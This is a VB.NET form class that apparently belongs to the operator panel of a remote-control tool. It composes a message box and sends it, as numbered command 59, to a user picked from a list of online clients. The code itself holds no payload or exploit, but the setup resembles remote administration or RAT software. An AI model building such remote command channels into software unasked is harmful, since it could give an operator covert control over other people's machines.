Public Class MessageBoxManager

    Private Sub MessageBoxManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ImageComboBoxMsgBoxIcons.Items.Clear()
        ImageComboBoxMsgBoxIcons.Items.Add(New ImageComboItem("None", New Font("Microsoft Sans Serif", 8), Color.Black, 0))
        ImageComboBoxMsgBoxIcons.Items.Add(New ImageComboItem("Information", New Font("Microsoft Sans Serif", 8), Color.Black, 1))
        ImageComboBoxMsgBoxIcons.Items.Add(New ImageComboItem("Question", New Font("Microsoft Sans Serif", 8), Color.Black, 2))
        ImageComboBoxMsgBoxIcons.Items.Add(New ImageComboItem("Warning", New Font("Microsoft Sans Serif", 8), Color.Black, 3))
        ImageComboBoxMsgBoxIcons.Items.Add(New ImageComboItem("Error", New Font("Microsoft Sans Serif", 8), Color.Black, 4))
        ImageComboBoxMsgBoxIcons.SelectedIndex = 0
        ImageComboBoxMsgBoxButtons.SelectedIndex = 0
    End Sub


    Private Sub ButtonTest_Click(sender As Object, e As EventArgs) Handles ButtonTest.Click
        MessageBox.Show(TextBoxMessage.Text, TextBoxTitle.Text, ChooseButtons(CStr(ImageComboBoxMsgBoxButtons.SelectedIndex)), ChooseIcon(CStr(ImageComboBoxMsgBoxIcons.SelectedIndex)))
    End Sub

    Private Function ChooseIcon(ByVal Index As String) As MessageBoxIcon
        Select Case Index
            Case "0"
                Return MessageBoxIcon.None
            Case "1"
                Return MessageBoxIcon.Information
            Case "2"
                Return MessageBoxIcon.Question
            Case "3"
                Return MessageBoxIcon.Exclamation
            Case "4"
                Return MessageBoxIcon.Error
            Case Else
                Return MessageBoxIcon.None
        End Select
    End Function

    Private Function ChooseButtons(ByVal Index As String) As MessageBoxButtons
        Select Case Index
            Case "0"
                Return MessageBoxButtons.OK
            Case "1"
                Return MessageBoxButtons.OKCancel
            Case "2"
                Return MessageBoxButtons.AbortRetryIgnore
            Case "3"
                Return MessageBoxButtons.YesNo
            Case "4"
                Return MessageBoxButtons.YesNoCancel
            Case Else
                Return MessageBoxButtons.OK
        End Select
    End Function
    Private Sub ButtonSend_Click(sender As Object, e As EventArgs) Handles ButtonSend.Click
        If (TextBoxTitle.Text.Contains("|")) Or (TextBoxMessage.Text.Contains("|")) Then
            MsgBox("Please avoid this char '|' in your message.", MsgBoxStyle.Exclamation, "Invalid Message")
            Exit Sub
        Else
            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If
            Dim SendString As String = TextBoxMessage.Text & "|||" & TextBoxTitle.Text & "|||" & ImageComboBoxMsgBoxIcons.SelectedIndex.ToString & "|||" & ImageComboBoxMsgBoxButtons.SelectedIndex.ToString
            Try
                Main.WriteData(SendString)
                Main.WriteCommand(Main.SelectedUserID & "|59")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Create Folder")
            End Try
        End If
    End Sub
End Class